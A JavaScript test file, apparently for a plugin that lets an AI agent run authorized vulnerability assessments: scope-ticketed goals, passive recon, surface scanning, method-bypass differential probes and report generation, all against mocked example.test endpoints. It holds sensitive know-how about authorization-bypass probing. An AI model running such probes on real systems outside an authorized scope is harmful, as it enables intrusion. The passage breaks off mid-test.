import assert from "node:assert/strict";
import test from "node:test";
import * as fsPromises from "node:fs/promises";
import * as nodeOs from "node:os";
import * as nodePath from "node:path";
import http from "node:http";
import { apply, parseTodoFeedback, srcInitialState, applySrcEvent, viewSrcState, classifyHttpRequest } from "../lib/src.js";
import { isJsonValue } from "@deepseek-ai/dsh-session";

class MemoryTable {
  rows = new Map();
  get(key) { return this.rows.get(key); }
  entries() { return this.rows.entries(); }
  async put(key, value) { this.rows.set(key, value); }
  async delete(key) { this.rows.delete(key); }
}

class MemoryDomain {
  tables = new Map();
  table(name) {
    if (!this.tables.has(name)) this.tables.set(name, new MemoryTable());
    return this.tables.get(name);
  }
  async close() {}
}

function harness() {
  const domain = new MemoryDomain();
  const tools = new Map();
  const sessions = new Map();
  const projections = new Map();
  const prompts = [];
  const commands = new Map();
  /* [local.34] 工具输出 schema 一致性闸：dsh 核心运行时按 additionalProperties:false 校验工具输出，
     undeclared 键直接报错（local.31 给 view 加 pendingApprovals 漏了 src_state schema 即炸）。
     测试 harness 直连 execute 不经过核心校验，所以在漏斗里补同样的闸：每个 h.run 都检查。 */
  const conformToolOutput = (name, tool, out) => {
    const schema = tool?.output?.schema;
    if (!schema || schema.additionalProperties !== false || schema.properties === void 0) return;
    if (out === null || typeof out !== "object") return;
    const declared = new Set(Object.keys(schema.properties));
    for (const key of Object.keys(out)) {
      if (!declared.has(key)) throw new Error(`[schema-gate] ${name} 输出键「${key}」未在 output schema 声明（运行时 additionalProperties:false 会报 invalid output）`);
    }
  };
  const ctx = {
    storageDomain: { open: async () => domain },
    tools: { register(tool) { tools.set(tool.name, tool); } },
    sessions: { get(id) { return sessions.get(id); } },
    subagents: { followupCalls: [], async followup(parent, sessionId, content) { this.followupCalls.push({ parent: parent.id, childSessionId: String(sessionId), content }); return `msg-${this.followupCalls.length}`; } },
    effect() {},
    inject(names, callback) {
      if (names.includes("sessionProjections")) callback({ sessionProjections: { register(spec) { projections.set(spec.key, spec); } } });
      if (names.includes("systemPrompt")) callback({ systemPrompt: { section(spec) { prompts.push(spec); } } });
      if (names.includes("commands")) callback({ commands: { register(def) { commands.set(def.name, def); } } });
    }
  };
  apply(ctx);
  const exec = (sessionId, parentSession) => {
    let s = sessions.get(sessionId);
    if (s === void 0) {
      const events = [];
      s = { events, append(type, data) { events.push({ type, data }); } };
      sessions.set(sessionId, s);
    }
    return { agent: { session: { id: sessionId, header: parentSession ? { parentSession } : {}, append: s.append } } };
  };
  const run = (name, args, execution) => {
    const tool = tools.get(name);
    const out = tool.execute(args, execution);
    /* [local.34] 全工具过 schema 闸（异步结果在 resolve 后检查）。 */
    if (out !== null && typeof out === "object" && typeof out.then === "function") {
      return out.then((v) => { conformToolOutput(name, tool, v); return v; });
    }
    conformToolOutput(name, tool, out);
    return out;
  };
  return { domain, ctx, tools, sessions, projections, prompts, commands, exec, run };
}
/* [local.26] 带 mock 审批服务的 harness：policy="allow"→返回 allowed-once，"reject"→返回 rejected。 */
function harnessWithApproval({ policy } = {}) {
  const h = harness();
  h.ctx.get = (name) => {
    if (name === "approval") return { async request() { return policy === "reject" ? "rejected" : "allowed-once"; } };
    return void 0;
  };
  return h;
}

test("SRC workflow persists, deduplicates checkpoints", async () => {
  const h = harness();
  const parentEvents = [];
  h.sessions.set("parent", { append(type, data) { parentEvents.push({ type, data }); } });
  const parent = h.exec("parent");
  const child = h.exec("child", "parent");

  const goal = await h.run("src_add_goal", { target: "https://example.test", objective: "authorized SRC assessment", authorization: "ticket-42" }, parent);
  assert.equal(goal.id, "goal-1");
  const intent = await h.run("src_add_intent", { title: "Map public endpoints", detail: "passive and low impact", goalId: goal.id }, parent);
  assert.equal(intent.id, "intent-1");

  const batch = {
    intentId: intent.id,
    facts: [{ kind: "http", target: "https://example.test", detail: "GET /health returns 200", confidence: "95%" }],
    assets: [{ type: "root-domain", value: "example.test", meta: "authorized" }],
    findings: [{ title: "Public diagnostic endpoint", severity: "low", description: "Exposes build metadata", impact: "Leaks deployment information", affectedScope: "Unauthenticated visitors to the health endpoint", remediation: "Remove build metadata from the response", pocEvidence: ["GET /health -> 200 with build field"], reproducibleSteps: ["GET /health"], victimImpact: "Unauthenticated visitors have deployment internals exposed and can be fingerprinted for targeted exploitation without awareness", attackPrerequisites: "Attacker needs only network access to the health endpoint; no authentication or user interaction required", concreteLossEvidence: ["fact-1"] }]
  };
  const firstBatch = await h.run("src_submit", { ...batch, stage: "progress", summary: "initial evidence" }, child);
  assert.deepEqual({ facts: firstBatch.facts, assets: firstBatch.assets, findings: firstBatch.findings, stage: firstBatch.stage }, { facts: 1, assets: 1, findings: 1, stage: "progress" });
  const duplicateBatch = await h.run("src_submit", { ...batch, stage: "completed", summary: "verification complete" }, child);
  assert.deepEqual({ facts: duplicateBatch.facts, assets: duplicateBatch.assets, findings: duplicateBatch.findings, stage: duplicateBatch.stage }, { facts: 0, assets: 0, findings: 0, stage: "completed" });
  const repeated = await h.run("src_submit", { ...batch, stage: "completed", summary: "verification complete" }, child);
  assert.equal(repeated.duplicateCheckpoint, true);
  /* [local.33] 改相对断言：src_add_goal 现在会多发一条域笔记快照事件，但重复 checkpoint 仍必须零新增。 */
  const eventsBeforeRepeat = parentEvents.length;
  await h.run("src_submit", { ...batch, stage: "completed", summary: "verification complete" }, child);
  assert.equal(parentEvents.length, eventsBeforeRepeat, "duplicate checkpoints must not append another projection event");

  const state = await h.run("src_state", {}, parent);
  assert.deepEqual(state.counts, { intents: 1, facts: 1, findings: 1, assets: 1, coverage: 0, research: 0, checkpoints: 2, observations: 0, userTodos: 0, pendingApprovals: 0, testAccounts: 0, domainNotes: 0 });
  assert.equal(state.intents[0].status, "completed");
  assert.equal(state.checkpoints.length, 2);
  assert.equal(state.counts.checkpoints, 2);
  const report = await h.run("src_report", {}, parent);
  assert.match(report.markdown, /子 Agent 检查点/);
});

test("goal records scope details in objective", async () => {
  const h = harness();
  const parent = h.exec("p");
  const goal = await h.run("src_add_goal", { target: "https://example.test", objective: "SRC | 已确认资产: example.test, api.example.test | 排除项: DoS", authorization: "ticket-7" }, parent);
  assert.equal(goal.id, "goal-1");
  const state = await h.run("src_state", {}, parent);
  assert.match(state.goal.objective, /api.example.test/);
  assert.match(state.goal.objective, /DoS/);
});

test("finalize engagement reports blockers and supports documented interruption", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "example.test", objective: "test", authorization: "ticket" }, parent);
  await h.run("src_add_intent", { title: "recon", goalId: "goal-1" }, parent);
  const blocked = await h.run("src_finalize_engagement", { remainingDirections: ["扩展子域枚举"], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
  assert.equal(blocked.ready, false);
  assert.ok(blocked.blockers.some((b) => /可继续推进的方向/.test(b)), "non-empty directions blocked");
  const blocked2 = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
  assert.equal(blocked2.ready, false);
  assert.match(blocked2.blockers[0], /未完成 intent/);
  const allowed = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }], allowIncomplete: true, allowIncompleteReason: "测试用：模拟用户指示停止" }, parent);
  assert.equal(allowed.ready, true);
  assert.match(allowed.warnings.join(" "), /受限完成/);
  const stateAfter = await h.run("src_state", {}, parent);
  const decl = stateAfter.coverage.find((row) => row.phase === "report" && row.category === "受限完成声明");
  assert.notEqual(decl, void 0);
  assert.match(decl.limitation, /用户指示停止/);
});

test("asset observations, research matrix, and coverage survive state and report", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "example.test", objective: "coverage", authorization: "ticket" }, parent);
  const intent = await h.run("src_add_intent", { title: "recon", goalId: "goal-1" }, parent);
  assert.equal(h.tools.has("src_record_asset_observation"), false);
  assert.equal(h.tools.has("src_record_recon"), false);
  const asset = await h.run("src_add_asset", { type: "subdomain", value: "api.example.test", source: "crt.sh", method: "passive", confidence: 0.9, status: "candidate" }, parent);
  assert.match(asset.id, /^asset-/);
  const research = await h.run("src_record_research", { intentId: intent.id, category: "authorization", hypothesis: "Object IDs may be cross-tenant accessible", preconditions: ["two test accounts"], status: "blocked", stopReason: "no approved second account", evidence: ["scope restriction"] }, parent);
  const coverage = await h.run("src_record_coverage", { assetId: asset.id, phase: "web", category: "authentication", status: "blocked", limitation: "WAF challenge", evidence: ["preflight 403"] }, parent);
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.assets[0].source, "crt.sh");
  assert.equal(state.research[0].id, research.id);
  assert.equal(state.coverage[0].id, coverage.id);
  const report = await h.run("src_report", {}, parent);
  assert.match(report.markdown, /资产与测试覆盖率/);
  assert.match(report.markdown, /漏洞研究矩阵/);
  await h.run("src_add_asset", { type: "subdomain", value: "API.EXAMPLE.TEST", source: "DNS", method: "low-impact", confidence: 1, status: "confirmed" }, parent);
  const updated = await h.run("src_state", {}, parent);
  assert.equal(updated.assets.length, 1);
  assert.equal(updated.assets[0].status, "confirmed");
  assert.equal(updated.assets[0].confidence, 1);
});

test("finding delivery requires complete SRC report fields", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "example.test", objective: "test", authorization: "ticket" }, parent);
  await h.run("src_add_intent", { title: "audit", goalId: "goal-1" }, parent);
  await assert.rejects(() => h.run("src_add_finding", { intentId: "intent-1", title: "incomplete", severity: "high", reproducibleSteps: ["GET /"] }, parent), /invalid arguments|impact/);
  await assert.rejects(() => h.run("src_submit", { intentId: "intent-1", facts: [], assets: [], findings: [{ title: "incomplete", severity: "high", reproducibleSteps: ["GET /"] }] }, h.exec("child", "p")), /invalid arguments|impact/);
});

test("references and child-only submission boundaries are enforced", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "example.test", objective: "test", authorization: "ticket" }, parent);
  await assert.rejects(() => h.run("src_add_fact", { intentId: "intent-404", detail: "x" }, parent), /unknown intent/);
  await assert.rejects(() => h.run("src_submit", { intentId: "intent-1", facts: [], assets: [], findings: [] }, parent), /only available to a delegated subagent/);
  await assert.rejects(() => h.run("src_add_intent", { title: "bad", goalId: "goal-1", derivedFromFactId: "fact-1" }, parent), /exactly one anchor/);
});

test("invalid child batches are rejected before any row is written", async () => {
  const h = harness();
  const parent = h.exec("p");
  h.sessions.set("p", { append() { throw new Error("projection must not be touched"); } });
  await h.run("src_add_goal", { target: "example.test", objective: "test", authorization: "ticket" }, parent);
  await h.run("src_add_intent", { title: "audit", goalId: "goal-1" }, parent);
  await assert.rejects(() => h.run("src_submit", {
    intentId: "intent-1",
    facts: [{ detail: "must not persist" }],
    assets: [],
    findings: [{ title: "invalid reference", severity: "high", impact: "test impact", affectedScope: "test scope", remediation: "test remediation", pocEvidence: ["test evidence"], reproducibleSteps: ["step"], affectedAssetId: "asset-404", victimImpact: "Victim accounts have their private records silently readable by third parties without any interaction or awareness", attackPrerequisites: "Attacker needs a valid low-privilege account and the ability to forge resource identifiers in requests", concreteLossEvidence: ["fact-1"] }]
  }, h.exec("child", "p")), /unknown asset/);
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.counts.facts, 0);
  assert.equal(state.counts.findings, 0);
});

test("surface scanning stops before paths when protection is detected", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "recon", authorization: "ticket" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async () => new Response("Attention Required Cloudflare", { status: 403, headers: { "content-type": "text/html", server: "cloudflare" } });
    const result = await h.run("src_scan_surface", { baseUrl: "https://example.test", paths: ["/admin", "/api"], concurrency: 32, rps: 10 }, parent);
    assert.equal(result.requested, 0);
    assert.equal(result.requiresDecision, true);
    assert.equal(result.stopped, "protection-detected");
  } finally { globalThis.fetch = originalFetch; }
});

test("src_collect_passive records passive hints and coverage", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "discovery", authorization: "ticket" }, parent);
  const intent = await h.run("src_add_intent", { title: "passive", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async (url) => {
      const path = new URL(url).pathname;
      if (path === "/robots.txt") return new Response("Disallow: /admin\nAllow: /api\n", { status: 200, headers: { "content-type": "text/plain" } });
      if (path === "/sitemap.xml") return new Response("<urlset><url><loc>https://api.example.test/docs</loc></url></urlset>", { status: 200, headers: { "content-type": "application/xml" } });
      return new Response('<html><a href="/login">login</a><script>fetch("/graphql")</script></html>', { status: 200, headers: { "content-type": "text/html" } });
    };
    const result = await h.run("src_collect_passive", { intentId: intent.id, baseUrl: "https://example.test", hostnames: ["api.example.test"], maxHints: 10 }, parent);
    assert.equal(result.requiresDecision, false);
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.coverage.some((c) => c.phase === "discovery" && c.category === "passive-collection"), true);
    assert.equal(state.facts.some((f) => /robots\.txt hint \/admin/.test(f.detail)), true);
    assert.equal(state.facts.some((f) => /interface hint \/graphql/.test(f.detail)), true);
    assert.equal(state.assets.some((a) => a.value === "api.example.test"), true);
    const report = await h.run("src_report", {}, parent);
    assert.match(report.markdown, /## API 发现摘要/);
    assert.match(report.markdown, /API\/html-js-hint/);
  } finally { globalThis.fetch = originalFetch; }
});

test("src_collect_passive promotes OpenAPI and GraphQL metadata into endpoint assets", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "api-discovery", authorization: "ticket" }, parent);
  const intent = await h.run("src_add_intent", { title: "passive-api", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async (url) => {
      const path = new URL(url).pathname;
      if (path === "/openapi.json") return new Response('{"openapi":"3.0.0","paths":{"/api/users":{},"/graphql":{}}}', { status: 200, headers: { "content-type": "application/json" } });
      if (path === "/graphql") return new Response('{"data":{"__schema":{"queryType":{"name":"Query"}}}}', { status: 200, headers: { "content-type": "application/json" } });
      if (path === "/robots.txt") return new Response('', { status: 200, headers: { "content-type": "text/plain" } });
      if (path === "/sitemap.xml") return new Response('', { status: 200, headers: { "content-type": "application/xml" } });
      return new Response('<html><script>fetch("/api/profile?id=1")</script></html>', { status: 200, headers: { "content-type": "text/html" } });
    };
    await h.run("src_collect_passive", { intentId: intent.id, baseUrl: "https://example.test", maxHints: 10 }, parent);
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.assets.some((a) => a.type === "endpoint" && a.value === "https://example.test/openapi.json"), true);
    assert.equal(state.assets.some((a) => a.type === "endpoint" && a.value === "https://example.test/graphql"), true);
    assert.equal(state.assets.some((a) => a.type === "endpoint" && a.value === "https://example.test/api/profile?id=1"), true);
    assert.equal(state.assets.some((a) => a.type === "endpoint" && a.value === "https://example.test/api/profile"), true);
    assert.equal(state.assets.some((a) => a.type === "endpoint" && /^api:openapi-schema/.test(a.meta)), true);
    assert.equal(state.assets.some((a) => a.type === "endpoint" && /^api:graphql-endpoint/.test(a.meta)), true);
    assert.equal(state.assets.some((a) => a.type === "endpoint" && /^api:html-js-family/.test(a.meta)), true);
    assert.equal(state.apiDiscovery.total >= 4, true);
    assert.equal(state.apiDiscovery.schemas >= 1, true);
    assert.equal(state.apiDiscovery.graphql >= 1, true);
    assert.equal(state.facts.some((f) => /api schema candidate \/openapi\.json/.test(f.detail)), true);
    assert.equal(state.facts.some((f) => /graphql candidate \/graphql/.test(f.detail)), true);
    assert.equal(state.facts.some((f) => /parameter hint id/.test(f.detail)), true);
  } finally { globalThis.fetch = originalFetch; }
});

test("src_collect_passive creates planned coverage skeletons for discovered API endpoints", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "api-coverage", authorization: "ticket" }, parent);
  const intent = await h.run("src_add_intent", { title: "passive-api", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async (url) => {
      const path = new URL(url).pathname;
      if (path === "/openapi.json") return new Response('{"openapi":"3.0.0","paths":{"/api/users":{},"/graphql":{}}}', { status: 200, headers: { "content-type": "application/json" } });
      if (path === "/graphql") return new Response('{"data":{"__schema":{"queryType":{"name":"Query"}}}}', { status: 200, headers: { "content-type": "application/json" } });
      if (path === "/robots.txt") return new Response('', { status: 200, headers: { "content-type": "text/plain" } });
      if (path === "/sitemap.xml") return new Response('', { status: 200, headers: { "content-type": "application/xml" } });
      return new Response('<html></html>', { status: 200, headers: { "content-type": "text/html" } });
    };
    await h.run("src_collect_passive", { intentId: intent.id, baseUrl: "https://example.test" }, parent);
    const state = await h.run("src_state", {}, parent);
    const openapiAsset = state.assets.find((a) => a.value === "https://example.test/openapi.json");
    const graphqlAsset = state.assets.find((a) => a.value === "https://example.test/graphql");
    assert.equal(Boolean(openapiAsset), true);
    assert.equal(Boolean(graphqlAsset), true);
    assert.equal(state.coverage.some((c) => c.assetId === openapiAsset.id && c.category === "schema-review" && c.status === "planned"), true);
    assert.equal(state.coverage.some((c) => c.assetId === graphqlAsset.id && c.category === "graphql" && c.status === "planned"), true);
    assert.equal(state.coverage.some((c) => c.assetId === graphqlAsset.id && c.category === "authorization" && c.status === "planned"), true);
  } finally { globalThis.fetch = originalFetch; }
});

test("finalize engagement warns on discovered API endpoints with no follow-up", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "api-gap", authorization: "ticket" }, parent);
  const intent = await h.run("src_add_intent", { title: "passive-api", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async (url) => {
      const path = new URL(url).pathname;
      if (path === "/openapi.json") return new Response('{"openapi":"3.0.0","paths":{"/api/users":{}}}', { status: 200, headers: { "content-type": "application/json" } });
      if (path === "/robots.txt") return new Response('', { status: 200, headers: { "content-type": "text/plain" } });
      if (path === "/sitemap.xml") return new Response('', { status: 200, headers: { "content-type": "application/xml" } });
      return new Response('<html></html>', { status: 200, headers: { "content-type": "text/html" } });
    };
    await h.run("src_collect_passive", { intentId: intent.id, baseUrl: "https://example.test" }, parent);
    await h.run("src_update_intent", { intentId: intent.id, status: "completed" }, parent);
    /* [local.20] untouched/autoOnly 从 warning 升级为 blocker：不带 allowIncomplete 会被拦。 */
    const gated = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
    assert.equal(gated.ready, false);
    assert.match(gated.blockers.join(" "), /API\/接口资产尚未进入研究或覆盖推进/);
    assert.match(gated.blockers.join(" "), /仍停留在自动生成骨架/);
    assert.equal(gated.blockers.some((b) => /未完成漏洞研究假设/.test(b)), true);
    const result = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }], allowIncomplete: true, allowIncompleteReason: "范围耗尽" }, parent);
    assert.equal(result.ready, true, "allowIncomplete bypasses the new gates");
    assert.match(result.warnings.join(" "), /已按「受限完成」处理/);
  } finally { globalThis.fetch = originalFetch; }
});

test("src_collect_passive stops on protection before collection", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "discovery", authorization: "ticket" }, parent);
  const intent = await h.run("src_add_intent", { title: "passive", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async () => new Response("blocked", { status: 403, headers: { "content-type": "text/html", server: "cloudflare" } });
    const result = await h.run("src_collect_passive", { intentId: intent.id, baseUrl: "https://example.test" }, parent);
    assert.equal(result.requiresDecision, true);
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.coverage[0].status, "blocked");
  } finally { globalThis.fetch = originalFetch; }
});

test("src_test_bypass performs a bounded baseline→variant differential and records evidence", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "bypass", authorization: "ticket" }, parent);
  const intent = await h.run("src_add_intent", { title: "authorization", goalId: "goal-1" }, parent);
  const research = await h.run("src_record_research", { intentId: intent.id, category: "method-bypass", hypothesis: "POST may bypass GET-based route authorization", preconditions: ["authorized test account"], status: "hypothesis" }, parent);
  // Baseline GET /admin → 403; POST /admin → 200. Variant differs from baseline = boundary differential.
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async (url, init) => {
      const method = (init?.method ?? "GET").toUpperCase();
      if (method === "POST") return new Response("ok", { status: 200, headers: { "content-type": "application/json" } });
      return new Response("forbidden", { status: 403, headers: { "content-type": "application/json" } });
    };
    const result = await h.run("src_test_bypass", {
      intentId: intent.id, researchId: research.id, category: "method-bypass", baseUrl: "https://example.test",
      baseline: { method: "GET", path: "/admin" },
      variants: [{ method: "POST", path: "/admin", allowBody: true, rawBody: "", note: "method variant" }]
    }, parent);
    assert.equal(result.differential, true);
    assert.equal(result.requiresDecision, false);
    assert.equal(result.results.some((r) => r.phase === "baseline" && r.status === 403), true);
    assert.equal(result.results.some((r) => r.phase === "variant-1" && r.status === 200), true);
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.research[0].status, "testing");
    assert.match(state.research[0].evidence.join(" "), /method-bypass/);
    assert.equal(state.coverage.some((c) => c.category === "bypass-verification"), true);
  } finally { globalThis.fetch = originalFetch; }
});

test("src_test_bypass stops on protection without commander force", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "bypass", authorization: "ticket" }, parent);
  const intent = await h.run("src_add_intent", { title: "auth", goalId: "goal-1" }, parent);
  const research = await h.run("src_record_research", { intentId: intent.id, category: "authorization-bypass", hypothesis: "path normalization may change auth outcome", status: "hypothesis" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async () => new Response("Challenge", { status: 429, headers: { "content-type": "text/html", server: "cloudflare" } });
    const result = await h.run("src_test_bypass", {
      intentId: intent.id, researchId: research.id, category: "authorization-bypass", baseUrl: "https://example.test",
      baseline: { method: "GET", path: "/" }, variants: [{ method: "GET", path: "/admin" }]
    }, parent);
    assert.equal(result.requiresDecision, true);
    assert.equal(result.differential, false);
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.coverage[0].status, "blocked");
    assert.match(state.coverage[0].limitation, /protection/);
  } finally { globalThis.fetch = originalFetch; }
});

test("session state remains isolated and goal reset clears only its owner", async () => {
  const h = harness();
  for (const id of ["a", "b"]) {
    const e = h.exec(id);
    await h.run("src_add_goal", { target: `${id}.test`, objective: "test", authorization: "ticket" }, e);
    await h.run("src_add_intent", { title: `intent-${id}`, goalId: "goal-1" }, e);
  }
  await h.run("src_add_goal", { target: "a2.test", objective: "reset", authorization: "ticket" }, h.exec("a"));
  const a = await h.run("src_state", {}, h.exec("a"));
  const b = await h.run("src_state", {}, h.exec("b"));
  assert.equal(a.counts.intents, 0);
  assert.equal(b.counts.intents, 1);
  assert.equal(b.goal.target, "b.test");
});

test("projection replay mirrors semantic deduplication", () => {
  const h = harness();
  const projection = h.projections.get("src");
  const call = (state, name, args) => projection.apply(state, { type: "tool/call", data: { name, arguments: JSON.stringify(args) } });
  let state = projection.init();
  state = call(state, "src_add_goal", { target: "example.test", objective: "test", authorization: "ticket" });
  state = call(state, "src_add_intent", { title: "audit", detail: "same", goalId: "goal-1" });
  state = call(state, "src_add_intent", { title: "AUDIT", detail: "SAME", goalId: "goal-1" });
  state = call(state, "src_add_fact", { intentId: "intent-1", kind: "http", target: "EXAMPLE.TEST", detail: "HTTP 200" });
  state = call(state, "src_add_fact", { intentId: "intent-1", kind: "http", target: "example.test", detail: "http 200" });
  state = call(state, "src_add_finding", { intentId: "intent-1", title: "Leak", severity: "low", impact: "impact", affectedScope: "scope", remediation: "fix", pocEvidence: ["evidence"], reproducibleSteps: ["GET /"] });
  state = call(state, "src_add_finding", { intentId: "intent-1", title: "LEAK", severity: "high", impact: "impact", affectedScope: "scope", remediation: "fix", pocEvidence: ["evidence"], reproducibleSteps: ["GET /"] });
  state = call(state, "src_record_asset_observation", { intentId: "intent-1", type: "subdomain", value: "api.example.test", source: "crt.sh", method: "passive", confidence: 0.9, status: "candidate" });
  state = call(state, "src_record_coverage", { phase: "web", category: "auth", status: "blocked", limitation: "WAF" });
  state = call(state, "src_record_research", { intentId: "intent-1", category: "authorization", hypothesis: "cross-tenant", status: "testing" });
  const view = projection.view(state);
  assert.equal(view.assets[0].source, "crt.sh");
  assert.equal(view.coverage[0].status, "blocked");
  assert.equal(view.research[0].status, "testing");
  state = call(state, "src_test_bypass", { intentId: "intent-1", researchId: "research-1", category: "method-bypass", baseUrl: "https://example.test", baseline: { method: "GET", path: "/admin" }, variants: [{ method: "POST", path: "/admin" }] });
  state = call(state, "src_collect_passive", { intentId: "intent-1", baseUrl: "https://example.test" });
  const replayed = projection.view(state);
  assert.equal(replayed.coverage.some((c) => c.category === "bypass-verification" && c.phase === "method-bypass"), true);
  assert.equal(replayed.coverage.some((c) => c.category === "passive-collection" && c.phase === "discovery"), true);
  assert.deepEqual(replayed.counts, { intents: 1, facts: 1, findings: 1, assets: 1, coverage: 3, research: 1, checkpoints: 0, observations: 0, userTodos: 0, pendingApprovals: 0, testAccounts: 0, domainNotes: 0 });
});

test("full SRC engagement end-to-end: scope → passive → research → coverage → bypass → finalize → report", async () => {
  const h = harness();
  const parent = h.exec("p");

  // 1) scope confirmation (the formal engagement boundary)
  await h.run("src_add_goal", { target: "https://example.test", objective: "authorized SRC assessment | 已确认资产: example.test, api.example.test | 排除项: DoS | 候选证据: official website", authorization: "ticket-42" }, parent);

  // 2) commander intent + passive discovery
  const intent = await h.run("src_add_intent", { title: "api discovery", detail: "passive surface mapping", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async (url) => {
      const path = new URL(url).pathname;
      if (path === "/robots.txt") return new Response("Disallow: /admin\n", { status: 200, headers: { "content-type": "text/plain" } });
      if (path === "/sitemap.xml") return new Response("", { status: 200, headers: { "content-type": "application/xml" } });
      if (path === "/openapi.json") return new Response('{"openapi":"3.0.0","paths":{"/api/users":{}}}', { status: 200, headers: { "content-type": "application/json" } });
      if (path === "/graphql") return new Response('{"data":{"__schema":{"queryType":{"name":"Query"}}}}', { status: 200, headers: { "content-type": "application/json" } });
      return new Response('<html><script>fetch("/api/profile?id=1")</script></html>', { status: 200, headers: { "content-type": "text/html" } });
    };
    const passive = await h.run("src_collect_passive", { intentId: intent.id, baseUrl: "https://example.test", maxHints: 10 }, parent);
    assert.equal(passive.requiresDecision, false);

    // 3) research hypothesis + coverage skeleton for a discovered API endpoint
    const research = await h.run("src_record_research", { intentId: intent.id, category: "authorization-bypass", hypothesis: "api users endpoint may bypass authorization", preconditions: ["authorized account"], status: "hypothesis" }, parent);
    const stateAfterPassive = await h.run("src_state", {}, parent);
    const openapiAsset = stateAfterPassive.assets.find((a) => a.value === "https://example.test/openapi.json");
    await h.run("src_record_coverage", { assetId: openapiAsset?.id, phase: "api", category: "authorization", status: "planned", evidence: ["derived from passive discovery"] }, parent);

    // 4) controlled bypass differential verification on the same hypothesis
    globalThis.fetch = async (url, init) => {
      const method = (init?.method ?? "GET").toUpperCase();
      if (method === "POST") return new Response("ok", { status: 200, headers: { "content-type": "application/json" } });
      return new Response("forbidden", { status: 403, headers: { "content-type": "application/json" } });
    };
    const bypass = await h.run("src_test_bypass", { intentId: intent.id, researchId: research.id, category: "method-bypass", baseUrl: "https://example.test", baseline: { method: "GET", path: "/api/users" }, variants: [{ method: "POST", path: "/api/users", allowBody: true, rawBody: "", note: "method variant" }] }, parent);
    assert.equal(bypass.differential, true);
    assert.equal(bypass.requiresDecision, false);

    // 5) mark intent completed, run finalize, and produce report
    await h.run("src_update_intent", { intentId: intent.id, status: "completed" }, parent);
    const finalize = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }], allowIncomplete: true, allowIncompleteReason: "e2e 演练停止" }, parent);
    assert.equal(finalize.ready, true);
    const report = await h.run("src_report", {}, parent);
    assert.match(report.markdown, /受限完成声明/);
    assert.match(report.markdown, /e2e 演练停止/);
    assert.match(report.markdown, /## API 发现摘要/);
    assert.match(report.markdown, /## 漏洞研究矩阵/);

    // 6) state summary reflects the whole engagement
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.apiDiscovery.total >= 1, true);
    assert.equal(state.counts.intents, 1);
  } finally { globalThis.fetch = originalFetch; }
});




test("finalize allowIncomplete without reason throws; reason lands in report declaration", async () => {
  const h = harness();
  const parent = h.exec("p");
